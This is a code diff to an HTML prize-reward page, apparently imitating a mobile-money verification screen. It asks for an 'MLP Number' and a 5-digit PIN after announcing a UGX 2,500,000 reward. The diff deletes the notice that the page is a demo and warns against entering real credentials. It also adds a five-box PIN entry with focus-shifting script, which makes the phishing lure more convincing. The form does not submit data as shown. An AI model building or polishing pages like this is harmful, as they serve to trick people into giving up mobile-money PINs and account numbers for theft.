@@ -27,22 +27,8 @@
             Congratulations! You have been selected for a reward of
             <strong>UGX 2,500,000</strong>
         </div>
-
-        <p class="notice">
-            This is a demonstration interface. Do not enter any real personal
-            information or credentials.
-        </p>
-
+        
         <form onsubmit="return false;">
-
-            <label for="fullname">Full Name</label>
-            <input
-                type="text"
-                id="fullname"
-                name="fullname"
-                placeholder="Enter your full name"
-                required
-            >
 
             <label for="phone">MLP Number</label>
             <input
@@ -53,27 +39,17 @@
                 pattern="[0-9]{10}"
                 required
             >
+            
 
-            <label for="reference">Reference Number</label>
-            <input
-                type="text"
-                id="reference"
-                name="reference"
-                placeholder="Promotion reference number"
-                required
-            >
+            <label>5-Digit Demo PIN</label>
 
-            <label for="pin">5-Digit Demo PIN</label>
-            <input
-                type="password"
-                id="pin"
-                name="pin"
-                placeholder="Enter 5-digit PIN"
-                pattern="[0-9]{5}"
-                maxlength="5"
-                inputmode="numeric"
-                required
-            >
+            <div class="pin-container">
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+            </div>
 
             <button type="submit" disabled>
                 Submit Verification
@@ -82,6 +58,31 @@
         </form>
 
     </div>
+
+    <script>
+        const pinInputs = document.querySelectorAll(".pin-container input");
+
+        pinInputs.forEach((input, index) => {
+
+            input.addEventListener("input", function () {
+                this.value = this.value.replace(/[^0-9]/g, "");
+
+                if (this.value.length === 1 &&
+                    index < pinInputs.length - 1) {
+                    pinInputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener("keydown", function (e) {
+                if (e.key === "Backspace" &&
+                    this.value === "" &&
+                    index > 0) {
+                    pinInputs[index - 1].focus();
+                }
+            });
+
+        });
+    </script>
 
 </body>
 </html>
